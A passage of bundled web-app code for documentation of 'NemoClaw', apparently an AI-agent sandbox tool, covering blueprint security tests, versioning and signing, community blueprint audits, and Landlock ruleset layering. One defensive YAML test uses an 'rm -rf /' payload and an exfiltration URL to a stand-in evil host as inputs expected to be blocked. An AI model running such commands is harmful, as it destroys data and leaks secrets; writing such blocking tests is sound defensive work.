cat ./test-output/*.md`}),e.jsx(a,{type:"info",title:"Iterative Development Workflow",children:e.jsx("p",{children:"Blueprint development is iterative. Start with the most restrictive policies possible, run the agent, observe what gets blocked in the TUI, and then selectively open up access. This approach follows the principle of least privilege and ensures you understand exactly what the agent needs. Common iteration patterns include: adding network endpoints the agent tries to reach, expanding filesystem paths the agent needs to read, and adjusting resource limits when the agent runs out of memory or time."})}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Writing Blueprint Tests"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw supports declarative test cases for blueprints. These tests verify that the blueprint's policies behave as expected and can be run in CI/CD pipelines."}),e.jsx(t,{language:"yaml",title:"tests/test-security.yaml",children:`# Security tests for doc-generator blueprint
name: "doc-generator security tests"

tests:
  - name: "cannot write to source directory"
    action:
      tool: file_write
      args:
        path: "/workspace/src/malicious.py"
        content: "import os; os.system('rm -rf /')"
    expect:
      result: blocked
      reason: "filesystem policy denies write to /workspace/src"

  - name: "cannot access internet"
    action:
      tool: web_fetch
      args:
        url: "https://evil-server.example.com/exfiltrate"
    expect:
      result: blocked
      reason: "network policy denies connection to evil-server.example.com"

  - name: "can read source files"
    action:
      tool: file_read
      args:
        path: "/workspace/src/main.py"
    expect:
      result: allowed

  - name: "can write to docs directory"
    action:
      tool: file_write
      args:
        path: "/workspace/docs/main.md"
        content: "# Main Module Documentation"
    expect:
      result: allowed`}),e.jsx(t,{language:"bash",title:"Running blueprint tests",children:`# Run all tests for a blueprint
nemoclaw blueprint test ./doc-generator/

# Run a specific test file
nemoclaw blueprint test ./doc-generator/ --file tests/test-security.yaml

# Run tests with verbose output
nemoclaw blueprint test ./doc-generator/ --verbose`}),e.jsx(s,{title:"Test with Real Policies",children:e.jsx("p",{children:"Blueprint tests execute within an actual sandbox with the blueprint's policies applied. They are not mocked. This means they test the real behavior of your Landlock filesystem rules, network namespace policies, and seccomp filters. If a test says a write is blocked, it is genuinely blocked by the kernel -- not by a simulated policy layer. This gives you high confidence that the policies will behave the same in production."})}),e.jsx(o,{title:"Create a Custom Blueprint",difficulty:"advanced",children:e.jsxs("ol",{className:"list-decimal list-inside space-y-2 mt-2",children:[e.jsx("li",{children:"Choose a specific agent use case (e.g., log analyzer, test runner, dependency auditor)."}),e.jsx("li",{children:"Scaffold a new blueprint with nemoclaw blueprint init."}),e.jsx("li",{children:"Define the minimal set of network endpoints the agent needs."}),e.jsx("li",{children:"Define the filesystem paths with appropriate read/write permissions."}),e.jsx("li",{children:"Write a system prompt that instructs the agent on its task and boundaries."}),e.jsx("li",{children:"Write at least three security test cases verifying that the agent cannot exceed its permissions."}),e.jsx("li",{children:"Run the blueprint against a real project and iterate on the policies."})]})}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"With your blueprint created and tested, the next step is understanding how to version it properly and distribute it to others. The next section covers semantic versioning for blueprints, distribution channels, and the trust model for shared blueprints."})]})}const O=Object.freeze(Object.defineProperty({__proto__:null,default:g},Symbol.toStringTag,{value:"Module"}));function y(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-white",children:"Versioning and Distributing Blueprints"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Once you have created a blueprint that works well for your use case, you will likely want to share it -- with your team, your organization, or the broader NemoClaw community. Distribution introduces challenges that do not exist when blueprints live only on your local machine: how do consumers know when a blueprint has changed? How do they know the blueprint they downloaded has not been tampered with? How do you manage breaking changes without disrupting existing users? This section covers NemoClaw's approach to blueprint versioning, distribution, integrity verification, and publishing."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Semantic Versioning for Blueprints"}),e.jsx(r,{term:"Blueprint Semantic Versioning",definition:"NemoClaw blueprints follow semantic versioning (semver): MAJOR.MINOR.PATCH. A MAJOR bump indicates breaking changes (removed permissions, changed tool interfaces, incompatible policy changes). A MINOR bump adds functionality in a backward-compatible way (new optional tools, additional allowed endpoints). A PATCH bump fixes bugs without changing behavior (corrected system prompt typos, documentation updates).",example:"Updating a blueprint from 1.2.0 to 1.3.0 because a new MCP server was added. Updating from 1.3.0 to 2.0.0 because the filesystem policy was restructured and the workspace mount point changed from /workspace to /project.",seeAlso:["Semantic Versioning","Backward Compatibility","Breaking Changes"]}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:'The version field in blueprint.yaml is not merely informational -- NemoClaw uses it to manage blueprint updates, check compatibility, and resolve dependencies. When a blueprint specifies a dependency on another blueprint, it can use semver ranges (e.g., "^1.2.0" means any version compatible with 1.2.0) just like package managers in the software development world.'}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Determining what constitutes a breaking change in a blueprint context requires careful consideration. Because blueprints define security boundaries, changes to policies are particularly sensitive:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Removing a network endpoint:"})," Breaking change. An agent workflow that depends on accessing that endpoint will fail."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Adding a network endpoint:"})," Minor change. Existing workflows continue to work; the agent simply has access to an additional endpoint."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Tightening filesystem permissions:"})," Breaking change. Agent operations that previously succeeded may now be blocked."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Loosening filesystem permissions:"})," Minor change, but with security implications. Existing functionality is unaffected, but the attack surface increases. This should be documented clearly."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Changing the system prompt:"})," Typically a minor or patch change, unless it fundamentally alters the agent's behavior or output format."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Changing resource limits:"})," Reducing limits is breaking (agent may OOM or timeout); increasing limits is minor."]})]}),e.jsx(t,{language:"yaml",title:"Version bumping in blueprint.yaml",children:`# Before (v1.2.0): allows api.github.com
name: "code-reviewer"
version: "1.2.0"
# ...

# After (v1.3.0): adds api.gitlab.com -- backward-compatible addition
name: "code-reviewer"
version: "1.3.0"
# ...

# After (v2.0.0): removes api.github.com, only allows api.gitlab.com -- breaking
name: "code-reviewer"
version: "2.0.0"
# ...`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Distribution Channels"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw supports several channels for distributing blueprints, each suited to different use cases and trust levels."}),e.jsx(n,{title:"Blueprint Distribution Channels",headers:["Channel","Trust Level","Best For","Setup Effort"],rows:[["NemoClaw Registry","High (signed, reviewed)","Public sharing with the community","Requires account, review process"],["Git Repository","Varies (depends on repo trust)","Team sharing, version control integration","Low -- any git host works"],["OCI Registry","Medium (signed containers)","Enterprise distribution, air-gapped environments","Moderate -- requires OCI registry"],["Direct File Transfer","Low (no verification)","Quick sharing between individuals","None"],["Organization Registry","High (internal PKI)","Enterprise-wide standardization","High -- requires internal registry setup"]]}),e.jsx(t,{language:"bash",title:"Distributing blueprints via different channels",children:`# Publish to the NemoClaw community registry
nemoclaw blueprint publish ./my-blueprint/
# Requires authentication and passes automated review checks

# Share via Git repository
cd my-blueprint
git init
git add .
git commit -m "Initial blueprint release v1.0.0"
git remote add origin git@github.com:your-org/my-agent-blueprint.git
git push -u origin main

# Install a blueprint from a Git repository
nemoclaw blueprint install git@github.com:your-org/my-agent-blueprint.git

# Package as an OCI artifact
nemoclaw blueprint package ./my-blueprint/ --output my-blueprint-1.0.0.tar.gz
# Push to an OCI registry
nemoclaw blueprint push my-blueprint-1.0.0.tar.gz oci://registry.example.com/blueprints/my-blueprint:1.0.0

# Install from an OCI registry
nemoclaw blueprint install oci://registry.example.com/blueprints/my-blueprint:1.0.0`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Digest Signing and Integrity Verification"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Because blueprints define security boundaries, trusting a blueprint means trusting that it has not been tampered with. NemoClaw uses cryptographic signing to establish this trust. When a blueprint is published, its contents are hashed and the hash is signed with the author's private key. When a consumer installs the blueprint, NemoClaw verifies the signature against the author's public key."}),e.jsx(t,{language:"bash",title:"Signing and verifying blueprints",children:`# Generate a signing key pair (first time only)
nemoclaw blueprint keygen
# Creates ~/.nemoclaw/keys/blueprint-signing.key (private)
# and ~/.nemoclaw/keys/blueprint-signing.pub (public)

# Sign a blueprint
nemoclaw blueprint sign ./my-blueprint/
# Generates .blueprint-signature file containing:
# - SHA-256 digest of all blueprint files
# - Ed25519 signature of the digest
# - Author's public key fingerprint

# Verify a blueprint's signature
nemoclaw blueprint verify ./my-blueprint/
# Checks the signature against known public keys
# Output: "Signature valid. Signed by: your-name (fingerprint: abc123...)"

# Import a trusted author's public key
nemoclaw blueprint trust-key ./their-public-key.pub

# List trusted keys
nemoclaw blueprint list-keys`}),e.jsx(a,{type:"info",title:"Signature Verification on Install",children:e.jsx("p",{children:"When installing blueprints from the NemoClaw registry, signature verification is automatic -- the registry enforces that all published blueprints are signed, and the registry's own key is pre-trusted. For blueprints from other sources (Git, OCI, direct transfer), NemoClaw will warn if the blueprint is unsigned or if the signing key is not trusted. You can configure NemoClaw to reject unsigned blueprints entirely with the setting require_signed_blueprints: true in your NemoClaw configuration."})}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Publishing to the NemoClaw Registry"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The NemoClaw blueprint registry is the official distribution channel for community blueprints. Publishing involves several steps designed to ensure quality and security."}),e.jsx(t,{language:"bash",title:"Publishing workflow",children:`# 1. Authenticate with the registry
nemoclaw auth login

# 2. Validate and sign your blueprint
nemoclaw blueprint validate ./my-blueprint/
nemoclaw blueprint sign ./my-blueprint/

# 3. Run the automated review checks
nemoclaw blueprint check ./my-blueprint/
# Checks include:
# - Schema validation
# - No hardcoded secrets
# - Policies are not overly permissive (e.g., allow-all network)
# - System prompt does not contain known prompt injection patterns
# - All referenced files exist
# - Version follows semver
# - README.md exists and is non-empty

# 4. Publish
nemoclaw blueprint publish ./my-blueprint/
# The blueprint enters a review queue. Automated checks run first,
# then community reviewers may inspect it before it becomes publicly listed.

# 5. Check publication status
nemoclaw blueprint status my-blueprint`}),e.jsx(s,{title:"Security Review for Published Blueprints",children:e.jsx("p",{children:"Blueprints published to the NemoClaw registry undergo automated security analysis. Blueprints that request overly broad permissions -- such as allow-all network policies, writable access to sensitive system paths, or uncapped resource limits -- will be flagged for manual review and may be rejected or require justification. This is intentional: the registry aims to be a trusted source of secure configurations, not a repository of convenience shortcuts that undermine sandbox security."})}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Versioning and distribution transform a blueprint from a local configuration file into a shareable, trustworthy artifact. In the next section, we explore the community ecosystem around blueprints -- where to find community-contributed blueprints, how to evaluate their safety, and how to contribute your own."})]})}const q=Object.freeze(Object.defineProperty({__proto__:null,default:y},Symbol.toStringTag,{value:"Module"}));function f(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-white",children:"Community Blueprints"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"One of NemoClaw's strengths is its growing ecosystem of community-contributed blueprints. Instead of building every agent configuration from scratch, you can start with a community blueprint that addresses a similar use case and customize it for your needs. The community has produced blueprints for coding assistants, security auditors, documentation generators, infrastructure managers, data pipeline operators, and many other agent patterns. However, because blueprints define security boundaries, using a community blueprint requires understanding how to evaluate its safety and trustworthiness."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Where to Find Community Blueprints"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Community blueprints are available through several channels, each with different discovery mechanisms and trust levels."}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"NemoClaw Blueprint Registry:"})," The official registry at blueprints.nemoclaw.dev is the primary source for community blueprints. All blueprints are signed, undergo automated security checks, and are searchable by category, use case, and popularity. This is the most trusted source."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"GitHub:"}),' Many blueprint authors host their blueprints in public GitHub repositories. Search for repositories with the "nemoclaw-blueprint" topic tag, or browse the curated awesome-nemoclaw list maintained by the community.']}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"NemoClaw Discord:"})," The #blueprints channel on the NemoClaw Discord is where community members share work-in-progress blueprints, request feedback, and announce new releases."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Organization Registries:"})," Some organizations maintain internal blueprint registries with configurations tailored to their specific infrastructure and compliance requirements. Check with your team if one exists."]})]}),e.jsx(t,{language:"bash",title:"Discovering and installing community blueprints",children:`# Search the NemoClaw registry
nemoclaw blueprint search "code review"
# Returns matching blueprints with name, version, author, description, rating

# Show detailed information about a blueprint
nemoclaw blueprint info community/code-reviewer
# Shows: description, permissions summary, version history,
# download count, community rating, security audit status

# Install a community blueprint
nemoclaw blueprint install community/code-reviewer
# Downloads to ~/.nemoclaw/blueprints/code-reviewer/
# Verifies signature and integrity automatically

# Install a specific version
nemoclaw blueprint install community/code-reviewer@2.1.0

# Install from a Git repository
nemoclaw blueprint install https://github.com/author/my-blueprint.git

# List installed blueprints
nemoclaw blueprint list --installed`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Evaluating Blueprint Safety"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"A blueprint is a security configuration. Installing and running a community blueprint means you are trusting that its author has defined appropriate security boundaries. Before running any community blueprint, you should inspect it carefully. NemoClaw provides tools to help with this evaluation, but ultimately the responsibility lies with you as the operator."}),e.jsx(s,{title:"Always Inspect Before Running",children:e.jsx("p",{children:"Never run a community blueprint without first reviewing its policies. A malicious or negligent blueprint could grant the agent unrestricted network access (enabling data exfiltration), writable access to sensitive directories (enabling system compromise), or excessive resource limits (enabling resource exhaustion attacks). The nemoclaw blueprint audit command provides an automated first-pass review, but you should also manually read the policy files."})}),e.jsx(t,{language:"bash",title:"Auditing a community blueprint",children:`# Run the automated security audit
nemoclaw blueprint audit community/code-reviewer

# Example output:
# === Security Audit: community/code-reviewer v2.1.0 ===
#
# Network Policy:
#   Allowed endpoints: 2
#     - api.github.com:443 (TLS required) ✓
#     - integrate.api.nvidia.com:443 (TLS required) ✓
#   Wildcard rules: 0 ✓
#   Allow-all: No ✓
#   Risk: LOW
#
# Filesystem Policy:
#   Writable paths: 2
#     - /workspace (recursive) ⚠ broad write access
#     - /tmp (recursive) ✓
#   Sensitive paths accessible: 0 ✓
#   Risk: MEDIUM (broad workspace write)
#
# Resource Limits:
#   Memory: 4096 MB ✓
#   CPU: 4 cores ✓
#   Runtime: 60 minutes ⚠ long runtime
#   Risk: LOW
#
# Tools:
#   shell: enabled ⚠ shell access enabled
#   file_read: enabled ✓
#   file_write: enabled ✓
#   web_fetch: enabled ✓
#
# Overall Risk Assessment: MEDIUM
# Recommendations:
#   - Consider restricting /workspace write access to a specific subdirectory
#   - Consider reducing maximum runtime if your use case allows

# View the raw policy files
nemoclaw blueprint inspect community/code-reviewer --show-policies`}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"When evaluating a blueprint, pay attention to these key risk indicators:"}),e.jsx(n,{title:"Blueprint Risk Indicators",headers:["Indicator","Low Risk","Medium Risk","High Risk"],rows:[["Network endpoints","1-3 specific hosts","4-10 specific hosts","Wildcard domains or allow-all"],["Filesystem write scope","Single directory","/workspace recursive","/ or /home recursive"],["Shell access","Disabled","Enabled with restrictions","Enabled without restrictions"],["Resource limits","Conservative (1-2 GB, 15 min)","Moderate (4 GB, 60 min)","Uncapped or very high"],["Init scripts","None or simple mkdir","Package installation","Downloads from internet"],["Signature","Signed by trusted key","Signed by unknown key","Unsigned"]]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Customizing Community Blueprints"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Community blueprints are starting points, not rigid configurations. The recommended workflow is to install a community blueprint, audit it, and then create a local fork with your customizations. This way you control the security boundaries while benefiting from the community's work on system prompts, tool configurations, and initialization scripts."}),e.jsx(t,{language:"bash",title:"Forking and customizing a community blueprint",children:`# Fork a community blueprint into your local blueprints directory
nemoclaw blueprint fork community/code-reviewer my-code-reviewer

# Edit the fork to tighten security for your environment
# For example, restrict network access to your GitHub Enterprise instance
cd ~/.nemoclaw/blueprints/my-code-reviewer/

# Edit policies/network.yaml to replace api.github.com with your GHE host
# Edit policies/filesystem.yaml to restrict write paths
# Edit system-prompt.md to add organization-specific guidelines

# Validate your modifications
nemoclaw blueprint validate .

# Test the modified blueprint
nemoclaw run --blueprint my-code-reviewer --dry-run`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Contributing Your Own Blueprints"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Contributing blueprints back to the community strengthens the ecosystem. If you have built a blueprint for a use case that others would find valuable, publishing it helps others avoid reinventing the wheel and raises the overall quality of agent security configurations."}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Follow the principle of least privilege:"})," Your blueprint should request only the minimum permissions necessary. Reviewers will scrutinize overly permissive configurations."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Write clear documentation:"})," Include a README.md explaining the use case, required environment variables, mount points, and any assumptions about the host environment."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Include tests:"})," Blueprint test cases demonstrate that the security boundaries work as intended and give consumers confidence."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Use environment variables for secrets:"})," Never hardcode API keys or credentials. Use _env suffixed fields in your configuration."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Test on multiple hardware configurations:"})," If your blueprint uses local inference, test it on different GPU configurations and document the requirements."]})]}),e.jsx(a,{type:"info",title:"Blueprint Quality Guidelines",children:e.jsx("p",{children:'The NemoClaw community has established quality guidelines for published blueprints. High-quality blueprints include: a comprehensive README, at least five security test cases, a changelog for each version, explicit documentation of all required environment variables and mount points, and comments in the policy YAML files explaining why each rule exists. Blueprints that meet these criteria receive a "verified" badge on the registry.'})}),e.jsx(o,{title:"Evaluate and Customize a Community Blueprint",difficulty:"intermediate",children:e.jsxs("ol",{className:"list-decimal list-inside space-y-2 mt-2",children:[e.jsx("li",{children:"Browse the NemoClaw blueprint registry and find a blueprint related to your work."}),e.jsx("li",{children:"Run nemoclaw blueprint audit on it and note any medium or high risk indicators."}),e.jsx("li",{children:"Fork the blueprint and tighten at least one policy (network, filesystem, or resources)."}),e.jsx("li",{children:"Add a security test case that verifies your tightened policy is enforced."}),e.jsx("li",{children:"Run the modified blueprint and confirm it still accomplishes its intended task."})]})}),e.jsx(l,{references:[{title:"NemoClaw Blueprint Registry",url:"https://blueprints.nemoclaw.dev",description:"Official registry for community blueprints with search, ratings, and security audit reports."},{title:"awesome-nemoclaw",url:"https://github.com/nemoclaw/awesome-nemoclaw",description:"Community-curated list of NemoClaw resources, blueprints, and tools."},{title:"Blueprint Contribution Guide",url:"https://docs.nemoclaw.dev/blueprints/contributing",description:"Official guide for contributing blueprints to the NemoClaw registry."}]})]})}const B=Object.freeze(Object.defineProperty({__proto__:null,default:f},Symbol.toStringTag,{value:"Module"}));function x(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-white",children:"Advanced Landlock: Ruleset Layering and Path Hierarchies"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"In earlier chapters, we introduced Landlock as the Linux kernel feature that NemoClaw uses to enforce filesystem access policies. We covered the basics: how Landlock restricts which paths a sandboxed process can read, write, and execute. This section goes deeper into Landlock's architecture, covering the subtleties that matter when you are building complex security policies -- ruleset layering, path hierarchy semantics, inheritance across forked processes, and the differences between kernel versions that affect which features are available."}),e.jsx(r,{term:"Landlock Ruleset",definition:"A Landlock ruleset is a kernel object that defines a set of access rights restricted for a set of filesystem paths. Once a ruleset is applied to a thread (via landlock_restrict_self), it constrains all subsequent filesystem operations by that thread and any threads or processes it creates. Multiple rulesets can be layered on top of each other, with the intersection of their allowed operations determining the effective permissions.",example:"A NemoClaw sandbox applies a base ruleset that denies all filesystem access, then adds rules allowing read access to /workspace/src and read-write access to /workspace/output. The effective permissions are the union of these specific rules intersected with the base restriction.",seeAlso:["Landlock","Filesystem Policy","Access Control"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Ruleset Layering"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Landlock supports stacking multiple rulesets on a single thread. When multiple rulesets are active, an operation is allowed only if every active ruleset permits it. This is an intersection model, not a union model -- adding a new ruleset can only further restrict access, never expand it. This is a fundamental security property: no code that runs after a Landlock ruleset is applied can escape the restrictions, even if it applies its own additional ruleset."}),e.jsx(t,{language:"c",title:"Landlock ruleset layering in C (simplified)",children:`// Layer 1: Applied by NemoClaw sandbox initialization
// Allows: read /workspace, read-write /tmp
struct landlock_ruleset_attr ruleset_attr_1 = {
    .handled_access_fs =
        LANDLOCK_ACCESS_FS_READ_FILE |
        LANDLOCK_ACCESS_FS_READ_DIR |
        LANDLOCK_ACCESS_FS_WRITE_FILE |
        LANDLOCK_ACCESS_FS_MAKE_REG,
};
int ruleset_fd_1 = landlock_create_ruleset(&ruleset_attr_1, sizeof(ruleset_attr_1), 0);

// Add rules to layer 1
add_path_rule(ruleset_fd_1, "/workspace",
    LANDLOCK_ACCESS_FS_READ_FILE | LANDLOCK_ACCESS_FS_READ_DIR);
add_path_rule(ruleset_fd_1, "/tmp",
    LANDLOCK_ACCESS_FS_READ_FILE | LANDLOCK_ACCESS_FS_WRITE_FILE | LANDLOCK_ACCESS_FS_MAKE_REG);

landlock_restrict_self(ruleset_fd_1, 0);

// Layer 2: Applied by the agent runtime for additional restrictions
// Further restricts to only /workspace/src (subset of layer 1's /workspace)
int ruleset_fd_2 = landlock_create_ruleset(&ruleset_attr_2, sizeof(ruleset_attr_2), 0);
add_path_rule(ruleset_fd_2, "/workspace/src",
    LANDLOCK_ACCESS_FS_READ_FILE | LANDLOCK_ACCESS_FS_READ_DIR);
add_path_rule(ruleset_fd_2, "/tmp",
    LANDLOCK_ACCESS_FS_READ_FILE | LANDLOCK_ACCESS_FS_WRITE_FILE);

landlock_restrict_self(ruleset_fd_2, 0);

// Effective permissions (intersection of layer 1 and layer 2):
//   /workspace/src: read (allowed by both layers)
//   /workspace/other: DENIED (allowed by layer 1, but not by layer 2)
//   /tmp: read + write (allowed by both layers)
//   /tmp MAKE_REG: DENIED (allowed by layer 1, but not by layer 2)`}),e.jsx(a,{type:"info",title:"Why Layering Matters for NemoClaw",children:e.jsx("p",{children:"NemoClaw uses ruleset layering to implement defense in depth. The OpenClaw sandbox applies a base restrictive ruleset, and NemoClaw may apply additional layers based on the blueprint's policies. If a blueprint's policy contains a misconfiguration that is overly permissive, the base layer still provides a safety net. The effective permissions are always the most restrictive combination of all layers."})}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Path Hierarchy Rules"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Landlock's path-based rules follow the filesystem hierarchy, but the semantics are not always intuitive. Understanding how rules interact with directory hierarchies is essential for writing correct policies."}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Directory rules include subdirectories:"})," A rule granting read access to /workspace implicitly grants read access to /workspace/src, /workspace/src/main.py, and all other descendants. Access is hierarchical by default."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"File rules are exact:"})," A rule granting access to a specific file (e.g., /etc/resolv.conf) applies only to that file, not to the containing directory or sibling files."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Parent directory access is not implied:"})," Granting access to /workspace/src/main.py does not grant access to /workspace/src/ (the directory listing). The process can read the file but cannot list the directory contents. This can cause confusing behavior if the agent tries to discover files before reading them."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Symlinks are resolved:"})," Landlock evaluates rules against the resolved (real) path, not the symlink path. A rule allowing access to /workspace/link will not grant access if the link points to /etc/shadow. The real target path must be allowed."]})]}),e.jsx(t,{language:"yaml",title:"NemoClaw filesystem policy with hierarchy awareness",children:`# Common pattern: grant read to a tree, write to a subtree
rules:
  # Read the entire project
  - path: "/workspace"
    access: read
    recursive: true

  # But only write to the output directory
  - path: "/workspace/output"
    access: read-write
    recursive: true

  # Grant access to a specific config file without exposing its directory
  - path: "/workspace/.env.example"
    access: read
    recursive: false   # Does not apply to descendants (file has none)

# NemoClaw translates these YAML rules into Landlock system calls,
# handling the conversion from human-readable access levels to
# Landlock access flags.`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Inheritance Across Processes"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Landlock rulesets are inherited by child processes created via fork() and preserved across execve(). This means that when a sandboxed agent spawns a subprocess -- for example, running git, python, or a build tool -- that subprocess inherits all Landlock restrictions from its parent. There is no escape hatch: the child process cannot remove or weaken the parent's Landlock restrictions, even if it runs as a different user or executes a setuid binary."}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"This property is critical for NemoClaw's security model. Agents frequently execute shell commands and spawn child processes. Without process inheritance, a malicious or compromised agent could bypass filesystem restrictions simply by running a new process. With Landlock inheritance, the sandbox is inescapable for the entire process tree."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Kernel Version Differences"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Landlock has evolved across kernel versions, with each version adding new capabilities. NemoClaw detects the kernel version at runtime and uses the most capable Landlock ABI available. Understanding the differences helps you know what protections are in place on your specific system."}),e.jsx(n,{title:"Landlock ABI Versions and Capabilities",headers:["ABI Version","Kernel","Added Capabilities"],rows:[["ABI 1","5.13+","Basic filesystem access control: read, write, execute, make_* for files and directories"],["ABI 2","5.19+","File refer (moving/linking files across different Landlock domains)"],["ABI 3","6.2+","File truncation control (LANDLOCK_ACCESS_FS_TRUNCATE)"],["ABI 4","6.7+","Network access control (TCP bind and connect restrictions)"],["ABI 5","6.10+","ioctl on device files control"]]}),e.jsx(s,{title:"ABI 4 and Network Control",children:e.jsx("p",{children:"Landlock ABI 4 (kernel 6.7+) added TCP network restrictions directly in Landlock, allowing bind and connect operations to be controlled by port. NemoClaw can use this to supplement its network namespace-based restrictions with an additional kernel-level enforcement layer. However, if you are running on a kernel older than 6.7, NemoClaw relies solely on network namespaces and iptables for network control. Check your kernel version with uname -r and the available Landlock ABI with the landlock status file in /sys/kernel/security/landlock/abi-version (if present)."})}),e.jsx(t,{language:"bash",title:"Checking Landlock support on your system",children:`# Check kernel version
uname -r

# Check if Landlock is enabled
cat /sys/kernel/security/landlock/abi-version 2>/dev/null || echo "Landlock not available"

# Expected: a number (1, 2, 3, 4, or 5) indicating the ABI version

# Check NemoClaw's detected Landlock capabilities
nemoclaw system info | grep -i landlock
# Output example:
# Landlock ABI: 4
# Landlock filesystem: enabled
# Landlock network: enabled (ABI 4+)`}),e.jsx(a,{type:"info",title:"Graceful Degradation",children:e.jsx("p",{children:"NemoClaw is designed to work across kernel versions with graceful degradation. On older kernels, features that require newer Landlock ABIs are handled by alternative mechanisms (e.g., network namespaces instead of Landlock network rules) or disabled with a warning. The nemoclaw system info command shows exactly which security features are available on your system and which mechanisms NemoClaw is using for each."})}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Understanding Landlock at this level of detail enables you to write more precise filesystem policies, debug access denials effectively, and make informed decisions about kernel version requirements for your NemoClaw deployments. The next section covers another kernel-level security mechanism: seccomp-bpf, which controls which system calls the sandboxed process can make."})]})}const E=Object.freeze(Object.defineProperty({__proto__:null,default:x},Symbol.toStringTag,{value:"Module"}));function b(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-white",children:"Writing Custom Seccomp-BPF Profiles"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"While Landlock controls which filesystem paths and network ports a sandboxed process can access, seccomp-bpf operates at a lower level: it controls which system calls the process can make at all. A system call (syscall) is the interface between user-space programs and the Linux kernel. Every meaningful operation -- opening a file, creating a network socket, forking a process, changing permissions, loading a kernel module -- goes through a syscall. By restricting which syscalls are available, seccomp-bpf provides a fundamental layer of defense that complements Landlock's path-based restrictions."}),e.jsx(r,{term:"seccomp-bpf",definition:"Secure Computing mode with Berkeley Packet Filter (seccomp-bpf) is a Linux kernel feature that allows a process to define a filter program (written in BPF bytecode) that is applied to every system call the process makes. The filter can allow, deny, 